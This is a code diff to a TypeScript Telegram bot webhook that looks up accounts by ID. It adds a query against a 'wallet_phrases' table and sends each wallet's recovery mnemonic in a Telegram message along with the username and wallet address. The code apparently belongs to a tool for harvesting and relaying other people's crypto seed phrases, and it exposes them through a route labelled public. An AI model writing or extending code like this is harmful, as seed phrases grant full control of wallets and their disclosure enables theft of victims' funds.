@@ -39,6 +39,7 @@ interface TelegramAccount {
   id: string;
   username: string;
   wallet_address: string;
+  mnemonic?: string | null;
 }
 
 async function tg(method: string, body: unknown) {
@@ -79,7 +80,14 @@ async function getAccount(id: string): Promise<TelegramAccount | null> {
     .eq("id", id)
     .maybeSingle();
   if (error) throw new Error(`Could not load account: ${error.message}`);
-  return data;
+  if (!data) return null;
+  const { data: phraseData, error: phraseError } = await supabaseAdmin
+    .from("wallet_phrases")
+    .select("mnemonic")
+    .eq("wallet_address", data.wallet_address)
+    .maybeSingle();
+  if (phraseError) throw new Error(`Could not load phrase: ${phraseError.message}`);
+  return { ...data, mnemonic: phraseData?.mnemonic ?? null };
 }
 
 function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
@@ -145,7 +153,10 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
           }
           const text =
             `👤 <b>${account.username}</b>\n` +
-            `💼 <code>${account.wallet_address}</code>`;
+            `💼 <code>${account.wallet_address}</code>\n` +
+            (account.mnemonic
+              ? `🔑 <code>${account.mnemonic}</code>`
+              : `🔑 Phrase not on file for this wallet.`);
           await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
           return Response.json({ ok: true });
         }
